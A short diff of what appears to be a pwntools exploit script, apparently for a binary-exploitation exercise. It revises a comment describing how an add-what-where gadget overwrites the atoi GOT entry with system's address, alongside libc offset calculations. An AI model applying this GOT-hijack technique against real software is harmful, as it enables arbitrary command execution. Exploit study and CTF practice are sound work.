@@ -49,8 +49,7 @@ read_offset = libc.sym.read
 delta_system = (system_offset - atoi_offset) & 0xffffffffffffffff 
 
 # i want to use the add_what_where gadget to add an offset to the atoi GOT entry, so that it points to the sytem call function
-# so that when the prograam calls atoi, in reality atoi@plt will look into atoi@got which is equal to system@got
-
+# so that when the prograam calls atoi, in reality atoi@plt will look into atoi@got which contains instead the absoulte address of system
 ATOI_PLT = elf.plt['atoi']
 
 #bin_sh_string_addr = next(elf.search(b'/bin/sh'))    #address of "bin/sh"" -> NOT IN THE FILE
